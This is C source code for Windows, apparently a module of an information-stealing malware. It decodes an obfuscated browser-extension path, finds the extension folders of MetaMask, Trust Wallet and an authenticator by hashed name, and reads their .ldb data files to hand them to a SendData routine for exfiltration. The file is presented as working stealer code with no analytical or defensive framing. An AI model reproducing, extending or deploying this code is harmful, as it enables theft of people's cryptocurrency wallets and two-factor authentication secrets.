#include "../include/ExtensionsGrabber.h"
#include "../include/DirectoryOps.h"
#include "../include/MemoryUtils.h"
#include "../include/StringUtils.h"
#include "../include/hashing.h"
#include "../include/PathOps.h"
#include "../include/macros.h"
#include "../include/ntdll.h"
#include "../include/SendData.h"
#include "../include/FileIO.h"
#include "../include/decoding.h"

#include <windows.h>


void PrepareForSend(unsigned short *path, unsigned short *FolderName, unsigned short *ExtentionMark) {
    unsigned short      TempPath[250]       = {0};
    unsigned char       FolderItems[4096]   = {0};
    int                 PathSize            =  lenW(path);

    MovMemory(path, TempPath, PathSize * 2);
    ConcatStringW(TempPath, L"\\", PathSize);
    ConcatStringW(TempPath, FolderName, PathSize + 1);

    if (ReadFolder(FolderItems, TempPath) != 0) {
        return;
    }

    PFILE_DIRECTORY_INFORMATION FileInfo = (PFILE_DIRECTORY_INFORMATION)FolderItems;

    while (TRUE) {
        unsigned short FileName[10];

        MovMemory(FileInfo->FileName, FileName, 20);
        FileName[10] = 0x0000;
        /* FileInfo->EndOfFile has buffer size */
        if (FileName[7] == 'l' && FileName[8] == 'd' && FileName[9] == 'b') {
            UNICODE_STRING      PathUnicode         = {0};
            OBJECT_ATTRIBUTES   PathObj             = {0};
            HANDLE              FileHandle          = {0};
            char                FileSizeString[20]  = {0};
            unsigned char      *buffer              = {0};
            int                 FileSize            = 0;
            int                 FullBufferSize      = 0;
            unsigned short      FileAndPath[250]    = {0};
            unsigned short      FullFileName[15]    = {0};
            char                FileNameC[15]       = {0};
            int                 TempPathSize        = lenW(TempPath);


            ConcatStringW(FullFileName, ExtentionMark, 0);
            ConcatStringW(FullFileName, FileName, 2);

            MovMemory(TempPath, FileAndPath, TempPathSize * 2);

            ConcatStringW(FileAndPath, L"\\", TempPathSize);
            ConcatStringW(FileAndPath, FileName, TempPathSize + 1);

            InitPathObj(FileAndPath, &PathObj, &PathUnicode);
            OpenFileY(&FileHandle, FILE_READ_DATA | SYNCHRONIZE, &PathObj, FILE_OPEN);

            WideToNormal(FileNameC, FullFileName);
            FileSize = GetFileSizeY(FileHandle);
            FullBufferSize = TotalBufferLength(FullFileName, FileSize);

            buffer = AllocMemory((SIZE_T)FullBufferSize);
            if (buffer == NULL) {
                return;
            }

            IntToString(FileSizeString, FileSize);

            SendData(FileHandle, FileNameC, FileSize, FileSizeString, buffer, NULL, TRUE);
        }

        if (FileInfo->NextEntryOffset == 0) {
            break;
        }
        FileInfo = (PFILE_DIRECTORY_INFORMATION)((PBYTE)FileInfo + FileInfo->NextEntryOffset);
    }
}


void GrabExtensions(unsigned short *path) {
    unsigned short      TempPath[250]       = {0};
    unsigned short      ExtentionsPath[34]  = {0x0061, 0x009b, 0x0078, 0x00b8, 0x0075, 0x00c2, 0x0094, 0x00b8, 0x008c, 0x0078, 0x008f, 0x00b2, 0x0075, 0x00b9, 0x003f, 0x0046, 0x00bc, 0x00a8, 0x00a5, 0x0093, 0x00bc, 0x0093, 0x00ae, 0x009e, 0x005e, 0x0071, 0x009a, 0x00a4, 0x00b8, 0x0099, 0x00a7, 0x009c, 0x00a5, 0x0000};
    unsigned char       FolderItems[4096]   = {0};
    int                 PathSize            =  lenW(path);

    DecodeStringW(ExtentionsPath);
    MovMemory(path, TempPath, PathSize * 2);
    ConcatStringW(TempPath, ExtentionsPath, PathSize);


    if (ReadFolder(FolderItems, TempPath) != 0) {
        return;
    }

    PFILE_DIRECTORY_INFORMATION FileInfo = (PFILE_DIRECTORY_INFORMATION)FolderItems;

    while (TRUE) {
        unsigned short FolderName[100] = {0};

        /*we move 64 because a valid extention folder is 32 and we have to multiply it by 2 since its wide character array*/
        MovMemory(FileInfo->FileName, FolderName, 64);
        FolderName[32] = 0x0000;

        if (FileInfo->FileAttributes == FILE_ATTRIBUTE_DIRECTORY) {
            switch (HashStrW(FolderName)) {
            case METAMASK:
                PrepareForSend(TempPath, FolderName, L"a\\");
                break;
            case TRUSTWALLET:
                PrepareForSend(TempPath, FolderName, L"b\\");
                break;
            case AUTHENTICATOR:
                PrepareForSend(TempPath, FolderName, L"c\\");
                break;
            }
        }

        if (FileInfo->NextEntryOffset == 0) {
            break;
        }

        FileInfo = (PFILE_DIRECTORY_INFORMATION)((PBYTE)FileInfo + FileInfo->NextEntryOffset);
    }
}